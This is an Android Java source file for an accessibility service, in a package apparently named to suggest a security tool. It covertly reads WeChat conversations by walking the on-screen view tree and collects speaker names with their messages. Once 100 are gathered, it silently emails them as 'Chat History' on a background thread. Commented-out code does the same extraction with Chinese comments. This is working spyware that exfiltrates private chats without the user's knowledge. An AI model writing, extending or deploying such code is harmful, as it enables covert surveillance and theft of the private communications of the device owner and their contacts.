package com.secmaster.app;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.content.Intent;
import android.content.res.Configuration;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.text.TextUtils;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.secmaster.R;

import java.util.Collection;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import javax.mail.MessagingException;

public class MyAccessibilityService extends AccessibilityService {

    @Override
    protected void onServiceConnected() {
        Log.d(TAG, "onServiceConnected ");
        super.onServiceConnected();
    }

    @Override
    public boolean onUnbind(Intent intent) {
        return super.onUnbind(intent);
    }

    @Override
    public void onRebind(Intent intent) {
        super.onRebind(intent);
    }

    @Override
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
    }

    Set<String> historyList = new HashSet<>();
    String profilePhoto = "";
    ConnectivityManager connectivityManager;
    final String tencent = "com.tencent.mm";

    @Override
    public void onCreate() {
        super.onCreate();
        connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        profilePhoto = getString(R.string.profile_photo);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    public void onInterrupt() {
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getSource() == null) {
            return;
        }
        switch (event.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_SCROLLED:
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                AccessibilityNodeInfo rootNode = getRootInActiveWindow();
                if (rootNode != null &&
                        TextUtils.equals(tencent, rootNode.getPackageName())) {
                    getWeChatLog(rootNode);
                }
                break;
        }
    }

    void walk(AccessibilityNodeInfo parent) {
        if (parent == null) {
            return;
        }

        CharSequence speaker = null;
        CharSequence content = null ;
        int count = parent.getChildCount();
        for (int i = 0; i < count; i++) {
            AccessibilityNodeInfo child = parent.getChild(i);
            if (child == null) {
                continue;
            }
            if (TextUtils.equals("android.widget.ImageView", child.getClassName())
                    && child.getContentDescription() != null) {
                speaker = child.getContentDescription();
            }
            if (TextUtils.equals("android.widget.TextView", child.getClassName())
                    && child.getText() != null) {
                content = child.getText();
            }
        }
        if (speaker != null && content != null) {
            String msg = (speaker + ": " + content).replace(profilePhoto, "");
            // log(msg);
            historyList.add(msg);
            if (historyList.size() >= 100 && isNetworkAvailable()) {
                sendMail(historyList);
                historyList.clear();
            }
            return;
        }
        for (int i = 0; i < count; i++) {
            walk(parent.getChild(i));
        }
    }

    private ExecutorService executorService = Executors.newSingleThreadExecutor();
    private void sendMail(Collection<String> historyList) {
        final StringBuilder sb = new StringBuilder();
        for (String history : historyList) {
            sb.append(history);
            sb.append('\n');
        }
        executorService.submit(new Runnable() {
            @Override
            public void run() {
                Mail mail = Mail.restoreConfig(getApplicationContext());
                try {
                    mail.send("Chat History", sb.toString());
                } catch (MessagingException e) {
                    // ops, should we store this, try another time ?
                    Log.e(TAG, e.toString(), e);
                }
            }
        });
    }

    private boolean isNetworkAvailable() {
        if (connectivityManager == null) {
            return false;
        }
        NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();
        if (networkInfo == null) {
            return false;
        }
        return networkInfo.isConnected();
    }

//    String chatName;
//    String chatRecord;
    private void getWeChatLog(AccessibilityNodeInfo rootNode) {
        walk(rootNode);
//        List<AccessibilityNodeInfo> listChatRecord = rootNode.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/o");
//        if (listChatRecord.size() == 0) {
//            return;
//        }
//        //获取最后一行聊天的线性布局（即是最新的那条消息）
//        AccessibilityNodeInfo finalNode = listChatRecord.get(listChatRecord.size() - 1);
//        //获取聊天对象list（其实只有size为1）
//        List<AccessibilityNodeInfo> imageName = finalNode.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/i_");
//        //获取聊天信息list（其实只有size为1）
//        List<AccessibilityNodeInfo> record = finalNode.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/ib");
//        if (imageName.size() != 0) {
//            if (record.size() == 0) {
//                //判断当前这条消息是不是和上一条一样，防止重复
//                if (!chatRecord.equals("对方发的是图片或者表情")) {
//                    //获取聊天对象
//                    chatName = imageName.get(0).getContentDescription().toString().replace(profilePhoto, "");
//                    //获取聊天信息
//                    chatRecord = "对方发的是图片或者表情";
//
//                    Log.e(TAG, chatName + "：" + "对方发的是图片或者表情");
//                    Toast.makeText(this, chatName + "：" + chatRecord, Toast.LENGTH_SHORT).show();
//                }
//            } else {
//                //判断当前这条消息是不是和上一条一样，防止重复
//                if (!chatRecord.equals(record.get(0).getText().toString())) {
//                    //获取聊天对象
//                    chatName = imageName.get(0).getContentDescription().toString().replace(profilePhoto, "");
//                    //获取聊天信息
//                    chatRecord = record.get(0).getText().toString();
//
//                    Log.e(TAG, chatName + "：" + chatRecord);
//                    Toast.makeText(this, chatName + "：" + chatRecord, Toast.LENGTH_SHORT).show();
//                }
//            }
//        }
    }

    private static final String TAG = MyAccessibilityService.class.getName();
}
